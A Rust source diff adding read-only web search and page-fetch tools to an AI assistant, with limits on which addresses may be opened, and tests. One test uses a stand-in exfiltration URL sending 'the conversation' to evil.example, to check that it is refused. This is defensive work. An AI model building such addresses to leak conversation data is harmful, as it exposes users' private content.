@@ -156,9 +156,36 @@ pub const TOOLS: &[Spec] = &[
     },
 ];
 
-/// The tools as an OpenAI `tools` array.
-pub fn schema() -> Vec<Value> {
-    TOOLS
+/// The web tools: they only read, so they run at once, with no question to
+/// the user. Offered alone in Chat and Code (when Settings turn the web on)
+/// and beside `TOOLS` in Agent mode. What they return is untrusted
+/// (`web::UNTRUSTED`).
+pub const WEB_TOOLS: &[Spec] = &[
+    Spec {
+        name: "web_search",
+        effect: Effect::Read,
+        description: "Search the web: titles, addresses and snippets.",
+        parameters: || {
+            json!({"type": "object", "properties": {
+                "query": {"type": "string", "description": "Search words."},
+                "count": {"type": "integer", "description": "1 to 8, default 5."}
+            }, "required": ["query"]})
+        },
+    },
+    Spec {
+        name: "fetch_page",
+        effect: Effect::Read,
+        description: "Read a web page as text. The address must come from a search result, a page or the user.",
+        parameters: || {
+            json!({"type": "object", "properties": {
+                "url": {"type": "string", "description": "Full https:// address."}
+            }, "required": ["url"]})
+        },
+    },
+];
+
+fn schema_of(specs: &[Spec]) -> Vec<Value> {
+    specs
         .iter()
         .map(|t| {
             json!({"type": "function", "function": {
@@ -170,8 +197,176 @@ pub fn schema() -> Vec<Value> {
         .collect()
 }
 
+/// The tools as an OpenAI `tools` array.
+pub fn schema() -> Vec<Value> {
+    schema_of(TOOLS)
+}
+
+/// The web tools as an OpenAI `tools` array.
+pub fn web_schema() -> Vec<Value> {
+    schema_of(WEB_TOOLS)
+}
+
 pub fn spec(name: &str) -> Option<&'static Spec> {
     TOOLS.iter().find(|t| t.name == name)
+}
+
+/// Whether `name` is a web tool.
+pub fn is_web(name: &str) -> bool {
+    WEB_TOOLS.iter().any(|t| t.name == name)
+}
+
+/// The answer for a tool that isn't offered in this reply.
+pub fn unavailable(name: &str) -> Outcome {
+    Outcome::err(format!("There is no tool called {name}."))
+}
+
+/// A web tool's most calls in one model turn: more are answered with a
+/// refusal, so one turn can't start dozens of requests.
+pub const MAX_WEB_CALLS_PER_TURN: usize = 4;
+
+/// Runs web tool `name` with `arguments` (the model's JSON). Blocks, up to
+/// the web's own time limits; stops soon after `cancel`.
+pub fn run_web(
+    session: &crate::web::Session<'_>,
+    name: &str,
+    arguments: &str,
+    cancel: &AtomicBool,
+) -> Outcome {
+    let args: Value = match serde_json::from_str(if arguments.trim().is_empty() {
+        "{}"
+    } else {
+        arguments
+    }) {
+        Ok(v @ Value::Object(_)) => v,
+        _ => return Outcome::err(format!("The arguments for {name} aren't a JSON object.")),
+    };
+    let text = |key: &str| args.get(key).and_then(Value::as_str).map(str::trim);
+    match name {
+        "web_search" => match text("query").filter(|q| !q.is_empty()) {
+            Some(query) => {
+                let count = args
+                    .get("count")
+                    .and_then(Value::as_u64)
+                    .map_or(crate::web::DEFAULT_RESULTS, |n| n as usize)
+                    .clamp(1, crate::web::MAX_RESULTS);
+                web_search(session, query, count, cancel)
+            }
+            None => Outcome::err("web_search needs a query."),
+        },
+        "fetch_page" => match text("url").filter(|u| !u.is_empty()) {
+            Some(url) => fetch_page(session, url, cancel),
+            None => Outcome::err("fetch_page needs a url."),
+        },
+        _ => unavailable(name),
+    }
+}
+
+fn web_search(
+    session: &crate::web::Session<'_>,
+    query: &str,
+    count: usize,
+    cancel: &AtomicBool,
+) -> Outcome {
+    match session.web().search(query, count, cancel) {
+        Ok(results) if results.is_empty() => Outcome::ok(
+            format!("No results for \"{query}\". Try different words."),
+            format!("Searched for \"{}\" (no results)", shorten(query, 60)),
+        ),
+        Ok(results) => {
+            let mut out = format!("Web results for \"{query}\":\n");
+            for (i, r) in results.iter().enumerate() {
+                out.push_str(&format!("\n{}. {}\n   {}\n", i + 1, r.title, r.url));
+                if !r.snippet.is_empty() {
+                    out.push_str(&format!("   {}\n", r.snippet));
+                }
+            }
+            out.push_str(&format!(
+                "\n({} To read a page, call fetch_page with its address.)",
+                crate::web::UNTRUSTED
+            ));
+            // The model may open the results' own addresses.
+            let urls: Vec<String> = results.iter().map(|r| r.url.clone()).collect();
+            session.show_results(&urls);
+            let n = results.len();
+            Outcome::ok(
+                out,
+                format!(
+                    "Searched for \"{}\" ({n} result{})",
+                    shorten(query, 60),
+                    if n == 1 { "" } else { "s" }
+                ),
+            )
+        }
+        Err(e) => Outcome::err(format!("Search failed: {e}")),
+    }
+}
+
+fn fetch_page(session: &crate::web::Session<'_>, url: &str, cancel: &AtomicBool) -> Outcome {
+    if !session.allows(url) {
+        return Outcome::err(
+            "That address was not in a search result, on a page you read, or in the user's \
+             messages, so it is not opened. Search for it first.",
+        );
+    }
+    match session.web().fetch(url, cancel) {
+        Ok(page) => {
+            let mut out = format!("Page: {}\n", page.url);
+            if !page.title.is_empty() {
+                out.push_str(&format!("Title: {}\n", page.title));
+            }
+            out.push_str(&format!("({})\n\n{}", crate::web::UNTRUSTED, page.text));
+            if page.truncated {
+                out.push_str("\n\n(The page is longer; this is its first part.)");
+            }
+            // The page's own links are not added to what may be opened: a page
+            // can carry any number of them, and each fetch is a covert channel
+            // (`web/session.rs`).
+            let kb = page.text.len().div_ceil(1024);
+            Outcome::ok(out, format!("Read {} ({kb} KB)", short_url(&page.url)))
+        }
+        Err(e) => Outcome::err(format!("Couldn't read {}: {e}", short_url(url))),
+    }
+}
+
+/// `text` cut to `max` characters, with "…" if it was.
+fn shorten(text: &str, max: usize) -> String {
+    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
+    if one.chars().count() <= max {
+        return one;
+    }
+    let cut: String = one.chars().take(max.saturating_sub(1)).collect();
+    format!("{}…", cut.trim_end())
+}
+
+/// An address in a few words for the window: "docs.rs/tokio/latest".
+pub fn short_url(url: &str) -> String {
+    match url::Url::parse(url.trim()) {
+        Ok(u) if u.host_str().is_some() => {
+            let mut s = u
+                .host_str()
+                .unwrap_or("")
+                .trim_start_matches("www.")
+                .to_string();
+            s.push_str(u.path().trim_end_matches('/'));
+            if u.query().is_some() {
+                s.push_str("?…");
+            }
+            shorten(&s, 70)
+        }
+        _ => shorten(url, 70),
+    }
+}
+
+/// What the window says while a tool runs: "Searching: rust async".
+pub fn progress(name: &str, arguments: &str) -> String {
+    let args: Value = serde_json::from_str(arguments).unwrap_or(Value::Null);
+    let text = |key: &str| args.get(key).and_then(Value::as_str).unwrap_or("");
+    match name {
+        "web_search" => format!("Searching: {}", shorten(text("query"), 80)),
+        "fetch_page" => format!("Reading: {}", short_url(text("url"))),
+        other => label(other, arguments),
+    }
 }
 
 /// What a tool gave back.
@@ -387,6 +582,8 @@ pub fn label(name: &str, arguments: &str) -> String {
         "write_file" => format!("Write {}", text("path")),
         "edit_file" => format!("Edit {}", text("path")),
         "run_command" => format!("Run {}", text("command")),
+        "web_search" => format!("Search the web for \"{}\"", text("query")),
+        "fetch_page" => format!("Read {}", text("url")),
         other => other.chars().take(40).collect(),
     }
 }
@@ -2021,5 +2218,171 @@ mod tests {
         let cut = clip(long);
         assert!(cut.len() <= MAX_OUTPUT + 64);
         assert!(cut.starts_with("… "));
+    }
+
+    // ---- the web tools
+
+    use crate::conversation::Message;
+    use crate::web::testing::Fake;
+    use crate::web::{Page, Session};
+
+    fn go_web(session: &Session<'_>, name: &str, args: Value) -> Outcome {
+        run_web(session, name, &args.to_string(), &AtomicBool::new(false))
+    }
+
+    fn ten_results() -> Vec<crate::web::SearchResult> {
+        (1..=10)
+            .map(|i| {
+                Fake::result(
+                    &format!("Result {i}"),
+                    &format!("https://example.org/r{i}"),
+                    &format!("About {i}."),
+                )
+            })
+            .collect()
+    }
+
+    #[test]
+    fn a_search_gives_titles_addresses_and_snippets() {
+        let fake = Fake::default().with_results("rust async", ten_results());
+        let session = Session::new(&fake, &[Message::user("tell me about rust async")]);
+        let found = go_web(
+            &session,
+            "web_search",
+            json!({"query": " rust async ", "count": 99}),
+        );
+        assert!(found.ok, "{found:?}");
+        // 8 at most, whatever was asked.
+        assert!(
+            found
+                .output
+                .contains("8. Result 8\n   https://example.org/r8\n   About 8.")
+        );
+        assert!(!found.output.contains("Result 9"));
+        assert!(found.output.contains(crate::web::UNTRUSTED));
+        assert_eq!(found.summary, "Searched for \"rust async\" (8 results)");
+        // Three without being asked for five.
+        let few = go_web(
+            &session,
+            "web_search",
+            json!({"query": "rust async", "count": 3}),
+        );
+        assert_eq!(few.summary, "Searched for \"rust async\" (3 results)");
+        let default = go_web(&session, "web_search", json!({"query": "rust async"}));
+        assert_eq!(default.summary, "Searched for \"rust async\" (5 results)");
+        // Nothing found is an answer, not an error.
+        let none = go_web(&session, "web_search", json!({"query": "zzzz"}));
+        assert!(none.ok && none.summary.contains("no results"), "{none:?}");
+        // The model's mistakes are answers too.
+        assert!(!go_web(&session, "web_search", json!({})).ok);
+        assert!(!go_web(&session, "web_search", json!({"query": "   "})).ok);
+        let bad = run_web(&session, "web_search", "not json", &AtomicBool::new(false));
+        assert!(!bad.ok && bad.output.starts_with("Error:"));
+    }
+
+    #[test]
+    fn a_page_is_read_when_it_was_shown() {
+        let page = Page {
+            url: "https://example.org/r2".into(),
+            title: "Result 2".into(),
+            text: "The body.\n\nSee [next](https://example.org/deeper).".into(),
+            truncated: true,
+        };
+        let fake = Fake::default()
+            .with_results("q", ten_results())
+            .with_page(page)
+            .with_page(Fake::page("https://example.org/deeper", "Deeper", "More."))
+            .with_failing_page("https://example.org/r3", "There is no such page (404).");
+        let session = Session::new(&fake, &[Message::user("look this up")]);
+        // Not shown yet: refused, and nothing was requested.
+        let early = go_web(
+            &session,
+            "fetch_page",
+            json!({"url": "https://example.org/r2"}),
+        );
+        assert!(
+            !early.ok && early.output.contains("Search for it first"),
+            "{early:?}"
+        );
+        assert!(fake.calls().is_empty());
+        go_web(&session, "web_search", json!({"query": "q"}));
+        let read = go_web(
+            &session,
+            "fetch_page",
+            json!({"url": "https://example.org/r2"}),
+        );
+        assert!(read.ok, "{read:?}");
+        assert!(
+            read.output
+                .starts_with("Page: https://example.org/r2\nTitle: Result 2\n(")
+        );
+        assert!(read.output.contains("The body."));
+        assert!(read.output.contains("this is its first part"));
+        assert_eq!(read.summary, "Read example.org/r2 (1 KB)");
+        // The page's own links may not: only search results and the user's
+        // words are on the list.
+        let deeper = go_web(
+            &session,
+            "fetch_page",
+            json!({"url": "https://example.org/deeper"}),
+        );
+        assert!(
+            !deeper.ok && deeper.output.contains("Search for it first"),
+            "{deeper:?}"
+        );
+        assert!(!fake.calls().iter().any(|c| c.contains("deeper")));
+        // A failing page tells the model why.
+        let gone = go_web(
+            &session,
+            "fetch_page",
+            json!({"url": "https://example.org/r3"}),
+        );
+        assert!(!gone.ok);
+        assert_eq!(
+            gone.summary,
+            "Couldn't read example.org/r3: There is no such page (404)."
+        );
+        // An address built for the occasion is not opened.
+        let sneaky = go_web(
+            &session,
+            "fetch_page",
+            json!({"url": "https://evil.example/?data=the+conversation"}),
+        );
+        assert!(!sneaky.ok);
+        assert!(!fake.calls().iter().any(|c| c.contains("evil")));
+        assert!(!go_web(&session, "fetch_page", json!({})).ok);
+    }
+
+    #[test]
+    fn web_tools_are_known_and_read_only() {
+        assert!(is_web("web_search") && is_web("fetch_page") && !is_web("read_file"));
+        assert!(WEB_TOOLS.iter().all(|t| t.effect == Effect::Read));
+        // Kept apart from the workspace tools, whose schema is Agent mode's.
+        assert!(spec("web_search").is_none());
+        let names: Vec<String> = web_schema()
+            .iter()
+            .map(|t| t["function"]["name"].as_str().unwrap().to_string())
+            .collect();
+        assert_eq!(names, vec!["web_search", "fetch_page"]);
+        assert_eq!(schema().len(), TOOLS.len());
+        assert_eq!(
+            label("web_search", r#"{"query":"x"}"#),
+            "Search the web for \"x\""
+        );
+        assert_eq!(
+            progress("web_search", r#"{"query":"rust  async"}"#),
+            "Searching: rust async"
+        );
+        assert_eq!(
+            progress(
+                "fetch_page",
+                r#"{"url":"https://www.example.org/a/b/?q=1#top"}"#
+            ),
+            "Reading: example.org/a/b?…"
+        );
+        assert_eq!(short_url("not a url"), "not a url");
+        assert!(short_url(&format!("https://example.org/{}", "x".repeat(200))).ends_with('…'));
+        let off = unavailable("web_search");
+        assert!(!off.ok);
     }
 }
